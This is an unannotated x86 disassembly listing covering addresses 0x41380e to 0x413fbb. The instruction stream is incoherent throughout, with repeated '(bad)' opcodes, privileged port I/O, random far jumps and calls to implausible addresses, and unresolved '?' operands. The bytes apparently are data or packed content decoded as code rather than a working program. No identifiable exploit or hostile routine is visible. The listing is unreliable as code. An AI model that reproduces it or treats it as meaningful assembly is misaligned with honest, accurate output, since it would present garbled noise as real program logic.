  41380e:	scas   al,BYTE PTR es:[edi]
  41380f:	push   ebx
  413810:	adc    al,0xf2
  413812:	shr    DWORD PTR [edi],cl
  413814:	push   ds
  413815:	jo     0x413870
  413817:	dec    ebx
  413818:	out    0xec,al
  41381a:	cmp    BYTE PTR [ecx-0x66],ch
  41381d:	add    cl,ch
  41381f:	mov    ebx,0xd3377f85
  413824:	cwde   
  413825:	cld    
  413826:	jle    0x4137da
  413828:	sar    BYTE PTR [edi],1
  41382a:	mov    bl,0xdc
  41382c:	mov    ecx,0x3d528c36
  413831:	add    esp,DWORD PTR [ecx]
  413833:	sub    ebp,DWORD PTR [edi]
  413835:	or     al,0xae
  413837:	sar    BYTE PTR [edx-0x6a],1
  41383a:	es pop ds
  41383c:	sqrtps xmm1,XMMWORD PTR [esi-0x39]
  413840:	in     eax,0xbb
  413842:	mov    ecx,0x1e9fc1af
  413847:	xchg   esp,eax
  413848:	push   edi
  413849:	dec    edi
  41384a:	adc    bl,BYTE PTR [ecx-0x7f58849c]
  413850:	or     esi,DWORD PTR [eax]
  413852:	dec    edx
  413853:	int3   
  413854:	shl    BYTE PTR [ebp+esi*8+0x68157946],cl
  41385b:	out    dx,al
  41385c:	sub    al,0x3b
  41385e:	fild   QWORD PTR [esi+0x76dcb4b8]
  413864:	fsub   DWORD PTR [ecx-0x5f196d5b]
  41386a:	test   al,0xdc
  41386c:	repnz and cl,BYTE PTR [ebp-0x2f42618b]
  413873:	mov    ecx,0x8c8fb15a
  413878:	aam    0xaf
  41387a:	popf   
  41387b:	and    dl,BYTE PTR [si+0x7b]
  41387f:	cmc    
  413880:	scas   al,BYTE PTR es:[edi]
  413881:	retf   
  413882:	pop    es
  413883:	mov    ch,0x1c
  413885:	jno    0x413884
  413887:	stos   DWORD PTR es:[edi],eax
  413888:	lds    ecx,FWORD PTR [edx]
  41388a:	in     al,0x76
  41388c:	int    0x8e
  41388e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388f:	or     al,0xc2
  413891:	and    eax,0x2051a26e
  413896:	mov    dh,BYTE PTR [ebx+0x4048e610]
  41389c:	iret   
  41389d:	call   0xe39cfb3a
  4138a2:	mov    DWORD PTR [eax+0x15be3d86],ebx
  4138a8:	cmp    bh,BYTE PTR [edx-0x2786cb64]
  4138ae:	mov    eax,0x70c65ed2
  4138b3:	pop    ebx
  4138b4:	xchg   ecx,eax
  4138b5:	mov    al,ds:0xe4045014
  4138ba:	test   al,0x80
  4138bc:	and    BYTE PTR [edi+0x9],bl
  4138bf:	jmp    FWORD PTR [esi]
  4138c1:	(bad)  
  4138c2:	sbb    DWORD PTR [ebx],eax
  4138c4:	jnp    0x4138ee
  4138c6:	lds    edi,FWORD PTR [ebx+ebp*2]
  4138c9:	add    esp,edx
  4138cb:	loop   0x4138c7
  4138cd:	push   ss
  4138ce:	ins    DWORD PTR es:[edi],dx
  4138cf:	lea    edx,[ebx+0x14]
  4138d2:	cmp    BYTE PTR [ebx+0x64f32e6a],al
  4138d8:	jg     0x413872
  4138da:	retf   0xa6f9
  4138dd:	ret    
  4138de:	inc    esi
  4138df:	std    
  4138e0:	xchg   ch,cl
  4138e2:	mov    bh,0x8b
  4138e4:	mov    ebx,0x1e90cec1
  4138e9:	in     eax,0x4c
  4138eb:	sti    
  4138ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ed:	les    edi,FWORD PTR [ebp+eiz*4-0x56be76e2]
  4138f4:	std    
  4138f5:	rcl    BYTE PTR gs:[edi],0x7d
  4138f9:	pushf  
  4138fa:	dec    ebp
  4138fb:	xchg   ebp,eax
  4138fc:	bound  ecx,QWORD PTR [edi-0x57]
  4138ff:	adc    al,0x9e
  413901:	or     al,0x6a
  413903:	pop    edi
  413904:	repz mov al,ds:0x247bbe5d
  41390a:	aaa    
  41390b:	mov    esi,0x40cb28fd
  413910:	xlat   BYTE PTR ds:[ebx]
  413911:	xchg   ebx,eax
  413912:	inc    edx
  413913:	repnz scas al,BYTE PTR es:[edi]
  413915:	sub    BYTE PTR [esp+esi*2+0x55],0xe4
  41391a:	push   ss
  41391b:	or     BYTE PTR [ecx*2+0x6f8eece3],ch
  413922:	sbb    dh,bl
  413924:	jmp    0xa22f8b5c
  413929:	(bad)  
  41392a:	adc    DWORD PTR [edx+0x4f],ecx
  41392d:	jecxz  0x41399a
  41392f:	ret    
  413930:	inc    esp
  413931:	retf   0xc39b
  413934:	repnz out 0x1d,eax
  413937:	pop    ebx
  413938:	inc    esi
  413939:	ret    0xed80
  41393c:	adc    dh,BYTE PTR [edx]
  41393e:	nop
  41393f:	dec    ecx
  413940:	imul   ecx,DWORD PTR [esi-0x43],0xffffffab
  413944:	jmp    0x4138fd
  413946:	pop    edx
  413947:	add    dl,BYTE PTR [ebx+0x7ad0dc96]
  41394d:	xchg   edx,eax
  41394e:	test   DWORD PTR [ebp+0x6294758f],edx
  413954:	call   0xf474:0x6b18a64
  41395b:	test   al,0x3
  41395d:	or     ah,ch
  41395f:	add    ah,bh
  413961:	or     esp,DWORD PTR [esi]
  413963:	or     eax,0x2423dc62
  413968:	aaa    
  413969:	dec    esp
  41396a:	daa    
  41396b:	or     esp,DWORD PTR [edi]
  41396d:	xor    dl,0x40
  413970:	mov    ah,0xc0
  413972:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413974:	sub    BYTE PTR [edi+0x40],dl
  413977:	sub    BYTE PTR [ecx],dl
  413979:	xchg   esp,eax
  41397a:	push   0x44
  41397c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41397d:	dec    ecx
  41397e:	mov    ebp,0x1cc773cb
  413983:	xchg   esi,eax
  413985:	lods   eax,DWORD PTR ds:[esi]
  413986:	arpl   WORD PTR [eax-0x2f],bp
  413989:	pusha  
  41398a:	imul   ebx,DWORD PTR ds:[esi-0x1],0xa5242322
  413992:	dec    ebx
  413993:	xchg   edi,eax
  413994:	jb     0x413a15
  413996:	xchg   BYTE PTR [ecx],bl
  413998:	fcmovnb st,st(5)
  41399a:	pushf  
  41399b:	and    eax,0xc7396cdd
  4139a0:	adc    eax,0xb0656082
  4139a5:	in     al,dx
  4139a6:	sub    dl,bl
  4139a8:	je     0x4139af
  4139aa:	dec    esp
  4139ab:	jmp    0xf05f0516
  4139b0:	push   esp
  4139b1:	fldenv [ebx]
  4139b3:	mov    cl,BYTE PTR [ecx+0x0]
  4139b6:	mov    bh,BYTE PTR [ecx+0x6d]
  4139b9:	aas    
  4139ba:	aad    0xf
  4139bc:	jmp    0x413a1e
  4139be:	jno    0x413a05
  4139c0:	(bad)  
  4139c1:	outs   dx,BYTE PTR ds:[esi]
  4139c2:	cdq    
  4139c3:	mov    fs,WORD PTR ds:0x625fc2c2
  4139c9:	es leave 
  4139cb:	xor    al,0x60
  4139cd:	ret    0x7626
  4139d0:	lods   al,BYTE PTR ds:[esi]
  4139d1:	jno    0x413a2d
  4139d3:	ret    
  4139d4:	imul   esp,DWORD PTR [edi],0xffffffb6
  4139d7:	sbb    al,0x57
  4139d9:	push   eax
  4139da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139db:	push   es
  4139dc:	mov    WORD PTR [eax],?
  4139de:	xlat   BYTE PTR ds:[ebx]
  4139df:	sahf   
  4139e0:	imul   edi,edi,0x6
  4139e3:	cmp    edx,DWORD PTR [ecx]
  4139e5:	call   0x47d0ff20
  4139ea:	lea    ebp,[esi+0x67619799]
  4139f0:	mov    esp,0xb5df0d0b
  4139f5:	mov    ?,WORD PTR [edx+eax*4]
  4139f8:	ret    0x684a
  4139fb:	add    ebx,ebx
  4139fd:	(bad)  
  4139fe:	dec    eax
  4139ff:	sub    al,0x7a
  413a01:	fmul   QWORD PTR [eax-0x683c846e]
  413a07:	inc    DWORD PTR [edx+0x1763587f]
  413a0d:	fist   WORD PTR [edi*4+0x4ebb8bf8]
  413a14:	cmp    bl,BYTE PTR [edx]
  413a16:	cs adc al,0x10
  413a19:	push   ebp
  413a1a:	push   esi
  413a1b:	int3   
  413a1c:	retf   0x85d7
  413a1f:	clc    
  413a20:	pop    edi
  413a21:	ja     0x413a2c
  413a23:	add    edx,DWORD PTR [edi+ebp*2+0x1a0e475]
  413a2a:	mov    esp,0x84b2744e
  413a2f:	sbb    dl,BYTE PTR ds:0x72679b5c
  413a35:	out    dx,al
  413a36:	int    0x3f
  413a38:	mov    bh,0xdc
  413a3a:	test   al,0xb7
  413a3c:	dec    ebx
  413a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3e:	cld    
  413a3f:	fwait
  413a40:	mov    edx,0xabe0cb93
  413a45:	or     cl,BYTE PTR [esi+0x7f]
  413a48:	and    edx,esi
  413a4a:	inc    ebx
  413a4b:	add    cl,al
  413a4d:	xchg   esp,eax
  413a4e:	mov    cl,0x51
  413a50:	dec    ebp
  413a51:	mov    eax,ds:0xa88ad2ff
  413a56:	push   0x2
  413a58:	pop    ebp
  413a59:	enter  0xc69,0x95
  413a5d:	aad    0x5c
  413a5f:	stos   DWORD PTR es:[edi],eax
  413a60:	es cmc 
  413a62:	xor    edx,ebx
  413a64:	or     DWORD PTR [ebx],edx
  413a66:	fst    QWORD PTR [edx]
  413a68:	out    dx,al
  413a69:	das    
  413a6a:	repnz out 0x19,eax
  413a6d:	neg    BYTE PTR [ecx]
  413a6f:	push   0xfffffff3
  413a71:	xchg   sp,ax
  413a73:	mov    dh,0xed
  413a75:	sbb    DWORD PTR [esi],0x26bfdfcb
  413a7b:	gs neg edx
  413a7e:	dec    esp
  413a7f:	imul   ecx,DWORD PTR [edi+0xb0a27a0],0x9b7c5937
  413a89:	xchg   ebx,eax
  413a8a:	mov    esp,0xa0f1ae07
  413a8f:	call   0xfe99cd3b
  413a94:	dec    ebp
  413a95:	loopne 0x413a8d
  413a97:	xchg   edx,eax
  413a98:	jg     0x413ad8
  413a9a:	dec    edi
  413a9b:	lahf   
  413a9c:	pop    ebx
  413a9d:	inc    al
  413a9f:	mov    cl,0x0
  413aa1:	bound  eax,QWORD PTR [eax+eiz*4-0x36]
  413aa5:	out    0xc2,eax
  413aa7:	cwde   
  413aa8:	jmp    0x6e06:0xc3574312
  413aaf:	out    dx,al
  413ab0:	hlt    
  413ab1:	addr16 xchg esi,eax
  413ab3:	xor    ah,ah
  413ab5:	lds    edi,FWORD PTR [esi+edx*8+0x48ed3432]
  413abc:	jae    0x413b2b
  413abe:	push   edx
  413abf:	sbb    edx,DWORD PTR [esi-0x7a6192ff]
  413ac5:	pop    ss
  413ac6:	sub    al,0x94
  413ac8:	cmp    edi,DWORD PTR [esi-0x59457952]
  413ace:	arpl   ax,si
  413ad0:	(bad)  
  413ad1:	push   ss
  413ad2:	cmp    al,0x3c
  413ad4:	fadd   QWORD PTR [esp+esi*1+0x5eaec818]
  413adb:	mov    edx,0xdce00abd
  413ae0:	mov    BYTE PTR [edi],bh
  413ae2:	jnp    0x413b36
  413ae4:	cmp    al,0x31
  413ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae7:	mov    dl,0xb4
  413ae9:	adc    ah,dl
  413aeb:	retf   0xedf5
  413aee:	pop    ebx
  413aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413af0:	fadd   DWORD PTR [eax]
  413af2:	(bad)  
  413af3:	cmp    al,0x9a
  413af5:	inc    ecx
  413af6:	dec    ecx
  413af7:	dec    ebx
  413af8:	arpl   WORD PTR [ebx-0x7d569b42],ax
  413afe:	les    esp,FWORD PTR [eax-0x2eacf930]
  413b04:	call   0x6014b930
  413b09:	cmp    esp,DWORD PTR [ebx+0x38f91a3a]
  413b0f:	adc    edx,DWORD PTR [ecx+0x40]
  413b12:	fidiv  DWORD PTR [esi]
  413b14:	push   esi
  413b15:	xchg   ecx,eax
  413b16:	fsubr  QWORD PTR [eax+0x4fb4e91]
  413b1c:	and    ecx,DWORD PTR [esi+0x47e23883]
  413b22:	jo     0x413ac8
  413b24:	in     eax,0x61
  413b26:	ins    DWORD PTR es:[edi],dx
  413b27:	fisubr WORD PTR [edx-0x7576ce9a]
  413b2d:	pushf  
  413b2e:	inc    edx
  413b2f:	jns    0x413b50
  413b31:	jp     0x413b1e
  413b33:	sub    al,0x66
  413b35:	xchg   esp,eax
  413b36:	xchg   edi,eax
  413b37:	push   ebx
  413b38:	pop    esp
  413b39:	gs dec esp
  413b3b:	call   0x7186:0xad6a2dab
  413b42:	or     al,0x40
  413b44:	mov    eax,ds:0x8d586276
  413b49:	mov    es,WORD PTR [ecx]
  413b4b:	mov    bh,BYTE PTR [edx+0x62cde03d]
  413b51:	sbb    eax,0x9e71d2cf
  413b56:	fnop   
  413b58:	addr16 pushf 
  413b5a:	adc    eax,0x9f3ca662
  413b5f:	push   cs
  413b60:	sbb    DWORD PTR [ebx+eiz*8+0xd34de82],0xffffffeb
  413b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b69:	mov    al,0x5c
  413b6b:	or     edx,0xc3973dc
  413b71:	ror    DWORD PTR [edi-0x5a],cl
  413b74:	mov    ebx,0x1d3babd5
  413b79:	cmp    al,0xd6
  413b7b:	test   ebp,eax
  413b7d:	sbb    al,0x84
  413b7f:	add    bh,bh
  413b81:	xlat   BYTE PTR ds:[ebx]
  413b82:	cmp    eax,0x4147739c
  413b87:	mov    ah,0xfd
  413b89:	jo     0x413b65
  413b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b8c:	inc    edi
  413b8d:	repz test DWORD PTR [eax-0x243b4fd3],edi
  413b94:	mov    ds:0xd15f405b,al
  413b99:	out    dx,eax
  413b9a:	inc    edx
  413b9b:	std    
  413b9c:	mov    WORD PTR [ebx+0x41d2a863],cs
  413ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba3:	xchg   edi,eax
  413ba4:	stc    
  413ba5:	dec    ecx
  413ba6:	mov    ecx,0x95396440
  413bab:	xor    eax,0x411f127c
  413bb0:	sub    cl,BYTE PTR [ebp+0x51]
  413bb3:	cs xchg ebp,eax
  413bb5:	sahf   
  413bb6:	mov    al,ds:0x6654a668
  413bbb:	loop   0x413be3
  413bbd:	jne    0x413c20
  413bbf:	or     DWORD PTR ds:0x56cff081,esi
  413bc5:	lods   eax,DWORD PTR ds:[esi]
  413bc6:	jmp    0x2c3e:0x2adc368e
  413bcd:	and    edx,DWORD PTR [esi]
  413bcf:	xchg   BYTE PTR [ecx+ecx*4-0x784cbe63],dh
  413bd6:	pushf  
  413bd7:	js     0x413c55
  413bd9:	jmp    FWORD PTR [esp+ebp*2+0x27]
  413bdd:	ret    0xbe82
  413be0:	je     0x413c57
  413be2:	mov    dh,BYTE PTR [edi+edx*8]
  413be5:	out    0xaa,eax
  413be7:	lahf   
  413be8:	sub    BYTE PTR [esi-0x719e7d44],dl
  413bee:	xchg   bh,bh
  413bf0:	inc    edx
  413bf1:	xchg   edx,eax
  413bf2:	sub    BYTE PTR [ebx+0x77],dh
  413bf5:	jecxz  0x413bcc
  413bf7:	and    bl,BYTE PTR [edi+0x3b]
  413bfa:	cdq    
  413bfb:	pop    ds
  413bfc:	pop    eax
  413bfd:	xor    eax,0x6c56ee9e
  413c02:	lods   al,BYTE PTR ds:[esi]
  413c03:	js     0x413bb4
  413c05:	mov    ebp,0xa0b877da
  413c0a:	addr16 call 0x3a1d8f60
  413c10:	and    DWORD PTR [ebx*4+0x6aa0ab0e],eax
  413c17:	adc    al,0x47
  413c19:	mul    BYTE PTR [eax+0x3f]
  413c1c:	popf   
  413c1d:	sar    DWORD PTR [ebx+0x6],0xd3
  413c21:	add    DWORD PTR [ebx+0x5f],ebx
  413c24:	call   DWORD PTR [edi-0x59]
  413c27:	data16 ins BYTE PTR es:[edi],dx
  413c29:	inc    esi
  413c2a:	mov    bl,0x74
  413c2c:	mov    eax,0x5f5737dc
  413c31:	or     BYTE PTR [edi],dl
  413c33:	inc    edi
  413c34:	dec    esi
  413c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c36:	mov    ss,WORD PTR ds:[eax+0x68]
  413c3a:	mov    ch,0xf7
  413c3c:	rol    cl,0x5
  413c3f:	xlat   BYTE PTR ds:[ebx]
  413c40:	jmp    0x413c9f
  413c42:	jl     0x413c8b
  413c44:	icebp  
  413c45:	sbb    eax,0xcf13a7d2
  413c4a:	mov    al,cl
  413c4c:	mov    al,0x7f
  413c4e:	xor    dh,al
  413c50:	sbb    BYTE PTR [edi-0x49],ch
  413c53:	xor    bl,ch
  413c55:	push   es
  413c56:	cmp    bh,dh
  413c58:	popa   
  413c59:	inc    esp
  413c5b:	pop    esp
  413c5c:	xchg   ebp,eax
  413c5d:	cmp    ebp,DWORD PTR [ebp+0x1d]
  413c60:	ffreep st(7)
  413c62:	std    
  413c63:	mov    BYTE PTR ds:0xafb9aa7d,bl
  413c69:	mov    ah,0xc1
  413c6b:	arpl   ax,di
  413c6d:	or     al,0x68
  413c6f:	or     al,0xdf
  413c71:	mov    DWORD PTR [edx+0x7131c9f6],esp
  413c77:	add    DWORD PTR [ebp-0x4c0cda7],ebx
  413c7d:	pusha  
  413c7e:	sar    BYTE PTR [edi+0x42],cl
  413c81:	xchg   BYTE PTR [edx],dh
  413c83:	sahf   
  413c84:	pop    ecx
  413c85:	xlat   BYTE PTR ds:[ebx]
  413c86:	dec    ecx
  413c87:	jnp    0x413c96
  413c89:	lock sbb dh,dh
  413c8c:	lea    esi,ds:0x33fa6b0
  413c92:	stc    
  413c93:	jmp    0x98fd:0xbf6acfa4
  413c9a:	inc    ebp
  413c9b:	adc    dl,dl
  413c9d:	fwait
  413c9e:	sbb    dh,ah
  413ca0:	scas   eax,DWORD PTR es:[di]
  413ca2:	mov    dh,BYTE PTR [edi+0x3335c050]
  413ca8:	jns    0x413c38
  413caa:	and    edx,ebx
  413cac:	shl    DWORD PTR [esi-0xa807f19],1
  413cb2:	push   edx
  413cb3:	loopne 0x413d19
  413cb5:	xabort 0x87
  413cb8:	mov    bl,BYTE PTR [ecx-0x3d2660e1]
  413cbe:	mov    dh,0xe4
  413cc0:	in     al,0x30
  413cc2:	sub    DWORD PTR ds:0x2cb267e8,esp
  413cc8:	mov    al,ds:0x1793534
  413ccd:	outs   dx,BYTE PTR ds:[esi]
  413cce:	sbb    al,cl
  413cd0:	out    0xff,al
  413cd2:	jbe    0x413cc6
  413cd4:	and    al,0xf4
  413cd6:	mov    eax,0xb5b712ba
  413cdb:	xchg   ecx,eax
  413cdc:	xchg   esi,eax
  413cdd:	add    DWORD PTR [eax],0x8c1a1079
  413ce3:	outs   dx,BYTE PTR ds:[esi]
  413ce4:	nop
  413ce5:	pop    ds
  413ce6:	or     BYTE PTR [edi+0x7a],dh
  413ce9:	in     eax,0x25
  413ceb:	sub    ch,BYTE PTR [esi-0x10a3a4ff]
  413cf1:	mov    ss,WORD PTR [esi-0x2972b3c]
  413cf7:	inc    esp
  413cf8:	hlt    
  413cf9:	xchg   esp,eax
  413cfa:	pop    es
  413cfb:	or     DWORD PTR [ebx],ebx
  413cfd:	mov    edi,0x3c990bc7
  413d02:	(bad)  
  413d03:	pop    ds
  413d04:	lahf   
  413d05:	xchg   ecx,eax
  413d06:	clc    
  413d07:	jbe    0x413cc4
  413d09:	std    
  413d0a:	adc    eax,0x8549358d
  413d0f:	sub    al,0x26
  413d11:	push   0xe57671b4
  413d16:	and    BYTE PTR [ecx],al
  413d18:	add    DWORD PTR [esi],ebx
  413d1a:	arpl   WORD PTR [esi-0x47],bp
  413d1d:	out    0x7f,eax
  413d1f:	pmulhw mm7,mm3
  413d22:	pop    esp
  413d23:	mov    BYTE PTR [edx],cl
  413d25:	push   es
  413d26:	and    eax,0xaa6bb55e
  413d2b:	call   0xc1726af7
  413d30:	sti    
  413d31:	daa    
  413d32:	popa   
  413d33:	sbb    eax,0x57f02424
  413d38:	cli    
  413d39:	jmp    0xddb820df
  413d3e:	es inc esp
  413d40:	mov    bh,0xaf
  413d42:	xor    BYTE PTR [esi+0x1d],dl
  413d45:	dec    esi
  413d46:	fistp  DWORD PTR [edx+0x27]
  413d49:	call   0x64c3:0xfa27d51f
  413d50:	rol    BYTE PTR [esp+esi*4-0x49],0x68
  413d55:	(bad)  
  413d57:	mov    ebp,0xa79bc06c
  413d5c:	shl    DWORD PTR ds:0xbeda30be,0xeb
  413d63:	stos   BYTE PTR es:[edi],al
  413d64:	pop    esp
  413d65:	lea    eax,[eax]
  413d67:	in     eax,0xf2
  413d69:	int3   
  413d6a:	xchg   edx,eax
  413d6b:	lock jecxz 0x413dcb
  413d6e:	mov    ah,0xeb
  413d70:	cmp    BYTE PTR ds:0x96ecdd14,bl
  413d76:	pusha  
  413d77:	loopne 0x413d64
  413d79:	push   edx
  413d7a:	sbb    edi,DWORD PTR [ecx-0x1c]
  413d7d:	mov    ebx,0x72a9ede4
  413d82:	stc    
  413d83:	retf   0xf885
  413d86:	inc    ebp
  413d87:	adc    eax,0x3c13ea95
  413d8c:	sbb    DWORD PTR ds:[ebx],ecx
  413d8f:	bound  edi,QWORD PTR [ecx+esi*4-0x891c885]
  413d96:	iret   
  413d97:	in     al,0x27
  413d99:	jge    0x413d49
  413d9b:	test   eax,0x39d10638
  413da0:	(bad)  
  413da1:	push   ebx
  413da2:	shr    BYTE PTR [edi+0x74a92555],0xc1
  413da9:	shr    DWORD PTR [ebx],cl
  413dab:	lea    edi,[ecx]
  413dad:	adc    eax,0xe61fe928
  413db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413db3:	fiadd  WORD PTR [bx+si]
  413db6:	and    eax,0x4f1c8201
  413dbb:	jmp    0x75bf:0x368c1093
  413dc2:	sub    DWORD PTR [eax+0x35],esi
  413dc5:	push   edi
  413dc6:	out    0x6b,eax
  413dc8:	add    BYTE PTR [ebp-0x3],cl
  413dcb:	shl    BYTE PTR [eax-0x6b],1
  413dce:	or     DWORD PTR [ebp+0x5db67f5b],eax
  413dd4:	test   BYTE PTR cs:[ebp+0x531136f4],al
  413ddb:	mov    ch,0xc6
  413ddd:	fadd   DWORD PTR ds:0x2a1af694
  413de3:	xor    bh,BYTE PTR [ebp+0x66]
  413de6:	fwait
  413de7:	imul   eax,DWORD PTR [esi+0x76],0x2cb3fda2
  413dee:	cmp    DWORD PTR [edi],esp
  413df0:	icebp  
  413df1:	adc    ch,BYTE PTR [edi]
  413df3:	shl    BYTE PTR [edx-0x49],1
  413df6:	(bad)  
  413df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413df8:	jl     0x413e69
  413dfa:	pop    ss
  413dfb:	push   0x98f9c89b
  413e00:	es std 
  413e02:	pop    es
  413e03:	mov    BYTE PTR [esi-0x1],dh
  413e06:	mov    ecx,0x4cd442d9
  413e0b:	jecxz  0x413e6c
  413e0d:	mov    cl,0x62
  413e0f:	mov    al,ds:0xe994173
  413e14:	fadd   QWORD PTR [ebp+0x6ff59ebd]
  413e1a:	je     0x413e52
  413e1c:	sbb    ebx,esp
  413e1e:	loope  0x413da8
  413e20:	push   ebp
  413e21:	xor    esi,DWORD PTR [esp+ebx*4]
  413e24:	push   es
  413e25:	test   DWORD PTR [esi-0x4174714e],eax
  413e2b:	inc    ebp
  413e2c:	mov    ecx,0xdd6e0480
  413e31:	sahf   
  413e32:	es jmp 0xb21c76d1
  413e38:	add    al,0x14
  413e3a:	mov    BYTE PTR [esi],dh
  413e3c:	loope  0x413e07
  413e3e:	aas    
  413e3f:	stos   BYTE PTR es:[edi],al
  413e40:	in     al,dx
  413e41:	call   0x7159:0xe67d55db
  413e48:	stos   BYTE PTR es:[edi],al
  413e49:	jno    0x413e9d
  413e4b:	or     DWORD PTR [edi-0x3e61fa45],eax
  413e51:	clc    
  413e52:	xor    al,ah
  413e54:	sub    al,0xd9
  413e56:	inc    esp
  413e57:	gs dec esp
  413e59:	mov    esi,0x7250adf0
  413e5e:	not    DWORD PTR [edx+0x8ba0684]
  413e64:	push   ecx
  413e65:	mov    edi,DWORD PTR [esi+0x2bbcda98]
  413e6b:	push   ecx
  413e6c:	fst    QWORD PTR [ebx]
  413e6e:	inc    eax
  413e6f:	cmp    ebx,DWORD PTR [eax+ecx*2]
  413e72:	in     al,0x64
  413e74:	cmp    eax,0xa2fa3e24
  413e79:	jnp    0x413e1d
  413e7b:	shl    BYTE PTR [eax-0x67d35a43],cl
  413e81:	arpl   WORD PTR [edi-0x39],bx
  413e84:	lock sbb BYTE PTR ds:0xf3439edf,ah
  413e8b:	lock push ds
  413e8d:	jnp    0x413e62
  413e8f:	test   DWORD PTR [ebx+edi*2],esi
  413e92:	pop    ds
  413e93:	lock ins DWORD PTR es:[edi],dx
  413e95:	pop    esi
  413e96:	add    al,0xa7
  413e98:	icebp  
  413e99:	int3   
  413e9a:	pop    esi
  413e9b:	xchg   esi,eax
  413e9c:	cs das 
  413e9e:	push   cs
  413e9f:	out    dx,al
  413ea0:	inc    eax
  413ea1:	adc    BYTE PTR cs:[eax],ah
  413ea4:	lods   eax,DWORD PTR ds:[esi]
  413ea5:	(bad)  
  413ea6:	and    BYTE PTR [esi+eax*1],dh
  413ea9:	fld    TBYTE PTR [eax-0x33]
  413eac:	push   ecx
  413ead:	mov    al,ds:0x529fed80
  413eb2:	mov    edi,DWORD PTR [edi+0x1eb2ba21]
  413eb8:	adc    esp,DWORD PTR [ecx+0x75]
  413ebb:	pusha  
  413ebc:	sub    cl,al
  413ebe:	add    eax,0xb4288680
  413ec3:	inc    ebp
  413ec4:	mov    edx,es
  413ec6:	leave  
  413ec7:	jbe    0x413e63
  413ec9:	arpl   WORD PTR [ecx-0x26d7a164],sp
  413ecf:	push   0x78
  413ed1:	popa   
  413ed2:	loop   0x413f33
  413ed4:	cwde   
  413ed5:	lds    ebx,FWORD PTR ds:0x4bc40aaf
  413edb:	lahf   
  413edc:	test   DWORD PTR [eax],esi
  413ede:	push   ecx
  413edf:	out    dx,al
  413ee0:	shl    DWORD PTR [edx-0x4c],0x94
  413ee4:	iret   
  413ee5:	daa    
  413ee6:	mov    BYTE PTR [eax+0x5aa854d0],dl
  413eec:	ds xchg ebx,eax
  413eee:	popa   
  413eef:	clc    
  413ef0:	lahf   
  413ef1:	repnz sar DWORD PTR ds:0xc2be6116,cl
  413ef8:	aam    0x56
  413efa:	scas   eax,DWORD PTR es:[edi]
  413efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413efc:	sub    esi,ebp
  413efe:	pop    es
  413eff:	dec    edx
  413f00:	popa   
  413f01:	mov    eax,DWORD PTR [ecx-0x7f]
  413f04:	adc    al,0x9f
  413f06:	push   ecx
  413f07:	mov    al,0xc4
  413f09:	or     dh,BYTE PTR [eax+0x7c]
  413f0c:	and    al,0x1e
  413f0e:	mov    DWORD PTR [edi],edx
  413f10:	mov    ecx,0xf337fa8a
  413f15:	xchg   ebx,eax
  413f16:	fisttp WORD PTR [esi]
  413f18:	enter  0x8069,0xf
  413f1c:	xchg   esi,eax
  413f1d:	add    ecx,DWORD PTR [ecx-0x2bc8123d]
  413f23:	pop    ecx
  413f24:	pop    ecx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	inc    ecx
  413f27:	cmc    
  413f28:	lods   eax,DWORD PTR ds:[esi]
  413f29:	bound  edx,QWORD PTR [ecx+0x55]
  413f2c:	add    al,0x22
  413f2e:	cwde   
  413f2f:	imul   edi,DWORD PTR ss:[edi-0x2f79e433],0x78e5192
  413f3a:	outs   dx,BYTE PTR ds:[esi]
  413f3b:	into   
  413f3c:	jle    0x413f36
  413f3e:	or     cl,BYTE PTR [eax]
  413f40:	jecxz  0x413ed6
  413f42:	scas   al,BYTE PTR es:[edi]
  413f43:	push   0x2b
  413f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f46:	add    edx,esp
  413f48:	adc    DWORD PTR [edi+ecx*8],esi
  413f4b:	aam    0xd3
  413f4d:	xlat   BYTE PTR ds:[ebx]
  413f4e:	xor    edi,DWORD PTR [eax+0x11]
  413f51:	inc    ebx
  413f52:	pop    ebp
  413f53:	sub    DWORD PTR [esi],0x21
  413f56:	jb     0x413fa1
  413f58:	cmp    ecx,DWORD PTR [edi]
  413f5a:	push   ss
  413f5b:	pop    esi
  413f5c:	push   0xe0dbc468
  413f61:	inc    edx
  413f62:	push   ebp
  413f63:	pop    ds
  413f64:	mov    edi,0x6e65fe2
  413f69:	mov    gs,WORD PTR [ecx]
  413f6b:	and    BYTE PTR [edi],ch
  413f6d:	mov    ds:0xa536dfc5,eax
  413f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f73:	xchg   esp,eax
  413f74:	mov    ah,0x91
  413f76:	jb     0x413fe8
  413f78:	test   al,0x1c
  413f7a:	mov    al,ds:0x7c685363
  413f7f:	dec    eax
  413f80:	lea    ebx,[esi+0x52b3a912]
  413f86:	enter  0xc8ea,0x64
  413f8a:	in     al,dx
  413f8b:	fcmovne st,st(1)
  413f8d:	test   eax,0x215fa1b1
  413f92:	std    
  413f93:	arpl   WORD PTR [ebx+0x67],bp
  413f96:	and    al,0x3c
  413f98:	sbb    DWORD PTR [ebp+0x55],ebx
  413f9b:	pop    eax
  413f9c:	mov    ss,WORD PTR [ecx+0x21]
  413f9f:	in     al,dx
  413fa0:	mov    al,ds:0x72f7be1d
  413fa5:	ds out dx,al
  413fa7:	cmp    ch,0x4f
  413faa:	jmp    DWORD PTR ds:0x9d878223
  413fb0:	test   al,0x3f
  413fb2:	test   BYTE PTR [edx-0x24],bl
  413fb5:	pop    ss
  413fb6:	sbb    eax,edi
  413fb8:	das    
  413fb9:	inc    ebx
  413fba:	push   edi
  413fbb:	dec    esi
